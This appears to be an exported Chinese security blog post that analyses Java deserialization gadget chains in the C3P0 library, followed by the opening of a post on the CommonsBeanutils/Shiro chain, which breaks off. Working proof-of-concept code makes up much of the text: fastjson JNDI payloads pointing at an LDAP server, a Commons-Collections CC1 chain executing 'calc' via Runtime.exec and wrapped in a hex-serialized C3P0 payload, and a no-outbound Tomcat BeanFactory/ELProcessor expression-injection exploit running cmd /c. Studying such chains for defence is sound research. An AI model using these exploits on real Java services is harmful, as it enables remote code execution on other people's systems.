<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setLoginTimeout</span><span class=\"params\">(<span class=\"keyword\">int</span> seconds)</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">getLoginTimeout</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> Logger <span class=\"title\">getParentLogger</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> SQLFeatureNotSupportedException </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        FileOutputStream file = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(file);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        FileInputStream file = <span class=\"keyword\">new</span> FileInputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(file);</span><br><span class=\"line\">        Object o = ois.readObject();</span><br><span class=\"line\">        <span class=\"comment\">//return o;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object object, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(object, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"JNDI\"><a href=\"#JNDI\" class=\"headerlink\" title=\"JNDI\"></a>JNDI</h1><p>这里以尝试挖掘的思路跟一下，ctrl+shift+F全局搜索一下lookup关键字，C3P0中也就10个结果，以 <strong>JndiRefForwardingDataSource</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220623225906987.png\" alt=\"image-20220623225906987\"></p>\n<p>可以看到，都是在 <strong>dereference()</strong> 被调用，参数 jndiName 通过 <strong>getter</strong> 方法获取</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220623230003748.png\" alt=\"image-20220623230003748\"></p>\n<p>那么先看一下 setter 方法，JndiRefDataSourceBase#setJndiName() ，这里关于 <a href=\"https://www.jianshu.com/p/4f1cd513a72d\">PropertyChangeEvent监听javabean的变化</a> 设置了jndiName的值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220623230458934.png\" alt=\"image-20220623230458934\"></p>\n<p>那么再看一下 <strong>dereference()</strong> ，ALT+F7 查找调用处，<strong>inner()</strong> 进行调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220623230736890.png\" alt=\"image-20220623230736890\"></p>\n<p>发现 inner() 都是通过 <strong>setter和getter进行调用</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220623232109498.png\" alt=\"image-20220623232109498\"></p>\n<p>综上，切合 fastjson 利用条件</p>\n<p>poc：起一个marshalsec的 ldap</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,&quot;jndiName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;calc&quot;&#125;</span><br><span class=\"line\">或</span><br><span class=\"line\">&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,&quot;jndiName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;calc&quot;, &quot;loginTimeout&quot;:0&#125;</span><br></pre></td></tr></table></figure>\n\n<p>另外，发现 C3P0PooledDataSource 也存在相同的利用点，但是 rebind()方法中parse一直出错</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220624001633007.png\" alt=\"image-20220624001633007\"></p>\n<h1 id=\"HEX序列化字节加载器\"><a href=\"#HEX序列化字节加载器\" class=\"headerlink\" title=\"HEX序列化字节加载器\"></a>HEX序列化字节加载器</h1><p>更多的是利用 fastjson，Snake YAML , JYAML,Yamlbeans , Jackson,Blazeds,Red5, Castor 来打二次反序列化</p>\n<p>在 <strong>WrapperConnectionPoolDataSourceBase#setUserOverridesAsString()</strong> 中设置 userOverridesAsString 的值后，当调用set方法 <strong>setUpPropertyListeners</strong> 时就能触发，而这个监听器正好在设置完userOverridesAsString就会调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220624172723646.png\" alt=\"image-20220624172723646\"></p>\n<p>**WrapperConnectionPoolDataSource#setUpPropertyListeners()**，中调用了  parseUserOverridesAsString</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220624172759074.png\" alt=\"image-20220624172759074\"></p>\n<p>parseUserOverridesAsString，截取字符串，HASM_HEADER 为定值 <strong>HexAsciiSerializedMap</strong>，所以构造的payload需要符合这样形式</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;HexAsciiSerializedMap:&quot;+HexString+&quot;:&quot;</span><br></pre></td></tr></table></figure>\n\n<p>然后将hex转为byte调用 <strong>SerializableUtils#fromByteArray()</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220624173050121.png\" alt=\"image-20220624173050121\"></p>\n<p>然后就是调用原生反序列化，搭配其他的Gadget，比如CC、CB，在框架中还能注入内存马</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220624173509189.png\" alt=\"image-20220624173509189\"></p>\n<p>poc，以CC1为例</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:hex编码内容;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Retention;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        map.put(<span class=\"string\">&quot;value&quot;</span>, <span class=\"string\">&quot;bbb&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object, Object&gt; transformMap = TransformedMap.decorate(map, <span class=\"keyword\">null</span>, chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor cons = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class=\"line\">        cons.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        Object o = cons.newInstance(Retention.class, transformMap);</span><br><span class=\"line\">        serialize(o);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        String hex = bytesToHexString(bytes,bytes.length);</span><br><span class=\"line\"></span><br><span class=\"line\">        String poc = <span class=\"string\">&quot;&#123;\\&quot;e\\&quot;:&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\&quot;&#125;,\\&quot;f\\&quot;:&#123;\\&quot;@type\\&quot;:\\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\&quot;,\\&quot;userOverridesAsString\\&quot;:\\&quot;HexAsciiSerializedMap:&quot;</span>+hex+<span class=\"string\">&quot;;\\&quot;&#125;&#125;&quot;</span>;</span><br><span class=\"line\">        JSON.parseObject(poc);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        FileOutputStream file = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(file);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        FileInputStream file = <span class=\"keyword\">new</span> FileInputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(file);</span><br><span class=\"line\">        Object o = ois.readObject();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">bytesToHexString</span><span class=\"params\">(<span class=\"keyword\">byte</span>[] bArray, <span class=\"keyword\">int</span> length)</span> </span>&#123;</span><br><span class=\"line\">        StringBuffer sb = <span class=\"keyword\">new</span> StringBuffer(length);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; length; ++i) &#123;</span><br><span class=\"line\">            String sTemp = Integer.toHexString(<span class=\"number\">255</span> &amp; bArray[i]);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (sTemp.length() &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                sb.append(<span class=\"number\">0</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            sb.append(sTemp.toUpperCase());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sb.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"不出网利用\"><a href=\"#不出网利用\" class=\"headerlink\" title=\"不出网利用\"></a>不出网利用</h1><p>环境：反序列化点</p>\n<p>先回顾一下 getObject()中，其实如果通过这三种方法去修改contextName的值，就可以直接 JNDI 的利用，在一道CTF题目中，有提到这点实现 <a href=\"https://firebasky.github.io/2022/06/04/ljctr-wp/#jndi-poc\">ljctr wp</a> ，但是比较麻烦，所以略过。</p>\n<ol>\n<li>修改C3P0源代码 比较简单</li>\n<li>通过agent技术去修改源代码</li>\n<li>像jre8u20 gadgets一样去操作反序列化的字节码（有点麻烦 理论上肯定可以）</li>\n</ol>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220624192203940.png\" alt=\"image-20220624192203940\"></p>\n<p>跟到 <strong>referenceToObject()</strong> 中，加载远程类是通过getFactoryClassLocation获取到URLClassloader，通过Class.forName进行远程触发，如果获取为null，就会获取当前线程的ClassLoader，然后实例化一个对象，最后在return的时候调用这个对象的 <strong>getObjectInstance()**，在高版本JDK中的一种绕过方法，</strong>利用Tomcat的getObjectInstance方法调用ELProcessor的eval方法实现表达式注入**</p>\n<blockquote>\n<p>org.apache.naming.factory.BeanFactory在getObjectInstance()中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。<br>而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/c3p0/image-20220624192431258.png\" alt=\"image-20220624192431258\"></p>\n<p>poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.naming.ResourceRef;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.sql.PooledConnection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.SQLException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.logging.Logger;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        PoolBackedDataSourceBase poolBackedDataSourceBase = <span class=\"keyword\">new</span> PoolBackedDataSourceBase(<span class=\"keyword\">false</span>);</span><br><span class=\"line\">        poc POC = <span class=\"keyword\">new</span> poc(<span class=\"string\">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        setFieldValue(poolBackedDataSourceBase,<span class=\"string\">&quot;connectionPoolDataSource&quot;</span>,POC);</span><br><span class=\"line\">        serialize(poolBackedDataSourceBase);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc</span> <span class=\"keyword\">implements</span> <span class=\"title\">ConnectionPoolDataSource</span>, <span class=\"title\">Referenceable</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> String classFactory;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> String classFactoryLocation;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">poc</span><span class=\"params\">(String classFactory,String classFactoryLocation)</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.classFactory = classFactory;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.classFactoryLocation = classFactoryLocation;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> Reference <span class=\"title\">getReference</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> NamingException </span>&#123;</span><br><span class=\"line\">            ResourceRef ref = <span class=\"keyword\">new</span> ResourceRef(<span class=\"string\">&quot;javax.el.ELProcessor&quot;</span>, <span class=\"keyword\">null</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;&quot;</span>, <span class=\"keyword\">true</span>,<span class=\"string\">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class=\"keyword\">null</span>);</span><br><span class=\"line\">            ref.add(<span class=\"keyword\">new</span> StringRefAddr(<span class=\"string\">&quot;forceString&quot;</span>, <span class=\"string\">&quot;x=eval&quot;</span>));</span><br><span class=\"line\">            String cmd = <span class=\"string\">&quot;calc&quot;</span>;</span><br><span class=\"line\">            ref.add(<span class=\"keyword\">new</span> StringRefAddr(<span class=\"string\">&quot;x&quot;</span>, <span class=\"string\">&quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;&quot;</span>+ cmd +<span class=\"string\">&quot;&#x27;]).start()\\&quot;)&quot;</span>));</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ref;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> PooledConnection <span class=\"title\">getPooledConnection</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> PooledConnection <span class=\"title\">getPooledConnection</span><span class=\"params\">(String user, String password)</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> PrintWriter <span class=\"title\">getLogWriter</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setLogWriter</span><span class=\"params\">(PrintWriter out)</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setLoginTimeout</span><span class=\"params\">(<span class=\"keyword\">int</span> seconds)</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">getLoginTimeout</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> SQLException </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> Logger <span class=\"title\">getParentLogger</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> SQLFeatureNotSupportedException </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        FileOutputStream file = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(file);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        FileInputStream file = <span class=\"keyword\">new</span> FileInputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(file);</span><br><span class=\"line\">        Object o = ois.readObject();</span><br><span class=\"line\">        <span class=\"comment\">//return o;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object object, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(object, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.cnblogs.com/CoLo/p/15850685.html\">Java安全之C3P0利用与分析-Zh1z3ven</a></p>\n<p><a href=\"https://blog.csdn.net/u013190417/article/details/124311482\">C3P0反序列化链学习</a></p>\n<p><a href=\"http://www.yulegeyu.com/2021/10/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/\">JAVA反序列化之C3P0不出网利用 | 雨了个雨’s blog</a></p>\n","categories":["Java反序列化"]},{"title":"CommonsBeanutils及shiro中利用","url":"/2023/12/25/CB%E9%93%BE/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这篇将介绍一下  CommonsBeanutils 链，以及没有 commons-collections 的Shiro反序列化利用</p>\n<h1 id=\"Apache-Commons-Beanutils\"><a href=\"#Apache-Commons-Beanutils\" class=\"headerlink\" title=\"Apache Commons Beanutils\"></a>Apache Commons Beanutils</h1><p>Apache Commons Beanutils  提供了对Java普通类对象（也成为 JavaBean） 的一些操作方法。</p>\n<p>至于JavaBean</p>\n<ul>\n<li>有一个public的无参数构造函数。</li>\n<li>属性可以透过get、set、is（可替代get，用在 布尔型 属性上）方法或遵循特定命名规则的其他方法访问。</li>\n<li>可序列化</li>\n</ul>\n<a id=\"more\"></a>\n\n<p>也就是说属性都可通过 <strong>访问器(读)</strong> 和 <strong>更改器(写)</strong> 来进行操作，也就是 getter 和 setter</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">public class Person &#123;</span><br><span class=\"line\">    private String name;</span><br><span class=\"line\">    private int age;</span><br><span class=\"line\">    public String getName() &#123; return this.name; &#125;</span><br><span class=\"line\">    public void setName(String name) &#123; this.name &#x3D; name; &#125;</span><br><span class=\"line\">    public int getAge() &#123; return this.age; &#125;  &#x2F;&#x2F;读</span><br><span class=\"line\">    public void setAge(int age) &#123; this.age &#x3D; age; &#125;  &#x2F;&#x2F;更改</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>commons-beanutils 提供了一个静态方法，<strong>PropertyUtils.getProperty</strong> ，可以调用任意 JavaBean 的getter方法。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PropertyUtils.getProperty(new Person(),&quot;name&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>就可以调用 Person 对象的 name属性的 getter方法。他还支持递归，获取属性，比如 <code>PropertyUtils.getProperty(obj,&quot;b.a&quot;)</code></p>\n<p>就可以获取 b属性（对象）下的a属性。不是真正调用具体的getter方法，可以说是一种抽象的方法，比如</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PropertyUtils.getProperty(new Person(),&quot;abc&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>并不是说真的去调用 Person 类的 abc 属性的 getter，而是调用getAbc()，不管这个类有没有abc属性。</p>\n<h1 id=\"流程分析\"><a href=\"#流程分析\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h1><p>也就是说当调用 <strong>PropertyUtils.getProperty(o1, property)</strong> 时 如果控制了<strong>o1</strong>，会自动调用 getter 方法，需要寻找一处<strong>符合getter格式</strong>的利用点，起到承上启下的作用，在 <strong>TemplatesImpl</strong> 中的 <strong>getOutputProperties()</strong> 符合条件，调用 <strong>newTransformer()</strong> 最后利用点最后调用到defineClass实现动态类加载。</p>\n<p><img 